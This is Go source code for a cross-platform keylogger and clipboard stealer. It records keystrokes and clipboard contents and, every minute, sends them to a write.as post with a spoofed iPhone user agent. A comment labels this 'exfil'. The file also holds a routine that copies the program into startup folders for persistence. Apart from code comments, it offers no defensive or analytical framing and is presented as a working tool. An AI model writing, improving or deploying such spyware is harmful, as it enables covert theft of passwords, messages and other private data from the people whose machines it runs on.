package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	hook "github.com/robotn/gohook"
	"golang.design/x/clipboard"
)

type Post struct {
	Body  string `json:"body"`
	Title string `json:"title"`
	Font  string `json:"font"`
	Web   bool   `json:"web"`
	Top   int    `json:"top"`
	Token string `json:"token"`
}

// id and token to send to write.as [global]
const ( // this gets cooked within an hour of inactivity
	urlID = ""
	token = ""
)

var (
	keyBuffer string
	mu        sync.Mutex
)

func main() {
	err := clipboard.Init()
	if err != nil {
		panic(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go clippy(ctx)
	go worker(cancel) // put the hooker to work!
	go pusher()

	select {} // keep goin indefinitely
}

// func to check whether user is admin or not
func isAdmin() bool {
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDDRIVE0")
		if err != nil {
			return false
		}
		return true
	case "darwin":
		if os.Geteuid() == 0 {
			return true
		}
		return false
	case "linux":
		if os.Geteuid() == 0 {
			return true
		}
		return false
	default:
		return false
	}
}

// func move the hooker to the starty path
func madam() error {
	executive, err := os.Executable()
	if err != nil {
		return err
	}
	var dir string
	switch runtime.GOOS {
	case "windows":
		if isAdmin() {
			dir = filepath.Join(os.Getenv("%ProgramData%"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		} else {
			dir = filepath.Join(os.Getenv("%APPDATA%"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		}
	case "linux":
		dir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
	case "darwin":
		dir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
	default:
		return errors.New("Error: unsupported operating system")
	}

	copyFile(executive, dir)

	return nil
}

// func to copy file to desti
func copyFile(source string, destination string) error {
	input, err := os.ReadFile(source)
	if err != nil {
		return err
	}

	err = os.WriteFile(destination, input, 0655)
	if err != nil {
		return err
	}

	return nil
}

// func to send data to write.as for exfil
func updatePimp(text string) error {

	body := Post{
		Body:  text,
		Title: "",
		Font:  "norm",
		Web:   true,
		Top:   172354,
		Token: token,
	}

	jsonPost, err := json.Marshal(body)
	if err != nil {
		return err
	}
	url := fmt.Sprintf("https://write.as/api/posts/%s", urlID)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonPost))
	if err != nil {
		return err
	}

	client := &http.Client{}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set( // default user agent iOS17
		"User-Agent",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 2000; 12.10.4; 14PROMAX)")

	fmt.Println("\n[*] Sending request...")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	fmt.Println(string(respBody))

	return nil
}

// func to put shorty to work
func worker(cancel context.CancelFunc) { // capture events
	events := hook.Start()
	defer hook.End()

	for e := range events {
		if e.Kind == hook.KeyDown {
			key := hook.RawcodetoKeychar(e.Rawcode)

			mu.Lock()

			if e.Rawcode == 14 { // accomodate for backspace/delete key in str
				if len(keyBuffer) > 0 {
					keyBuffer = keyBuffer[:len(keyBuffer)-1] // remove last char
				}
			} else {
				keyBuffer += key
			}

			// if e.Rawcode == 27 { // ESC key
			// 	fmt.Println("\n[!] Exiting")
			// 	cancel()
			// 	break
			// }

			mu.Unlock()
		}
	}
}

// func to push data back to the server & timer for such
func pusher() { // push to the main man
	for {
		time.Sleep(60 * time.Second) // default timer

		mu.Lock()
		if len(keyBuffer) > 0 {
			_ = updatePimp(keyBuffer)
			keyBuffer = "" // Reset buffer
		}
		mu.Unlock()
	}
}

// func to get clipboard
func clippy(ctx context.Context) {
	ch := clipboard.Watch(ctx, clipboard.FmtText)
	var lastText string

	for data := range ch {
		text := string(data)
		if text != lastText { // stop duplicate entries
			mu.Lock()
			keyBuffer = "\n" + text + "\n"
			mu.Unlock()
			lastText = text
		}
		time.Sleep(500 * time.Millisecond)
	}
}
